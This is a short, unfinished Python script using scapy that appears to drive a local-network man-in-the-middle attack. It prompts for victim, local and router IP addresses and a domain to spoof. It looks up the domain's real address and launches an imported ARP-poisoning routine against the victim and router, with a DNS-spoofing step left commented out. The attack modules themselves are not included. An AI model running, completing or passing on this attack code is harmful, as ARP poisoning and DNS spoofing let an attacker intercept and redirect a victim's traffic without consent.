from scapy.all import *
from multiprocessing import Process
import os
import argparse
import arp_poison
import dns_packet_spoof

def get_original_IP(domain):
    dnsr = sr1(IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain)))
    ip = dnsr.summary()
    return ip[20:len(ip)-2]


def main():

    vic = raw_input("input Victim IP address\n")
    local = raw_input("input local IP address\n")
    router = raw_input("input router IP address\n")
    domain = raw_input ("input domain to be spoofed\n")
    domainIP = get_original_IP(domain)

    p1 = Process(target = arp_poison.main, args=([router,vic],))
    p1.start()
    p1.join()

    #p2 = Process(target = dns_packet_spoof.main, args=)
# set variablee, classes??
# run as separate processes
# x = Process( target = func, args = ("thing",))

main()
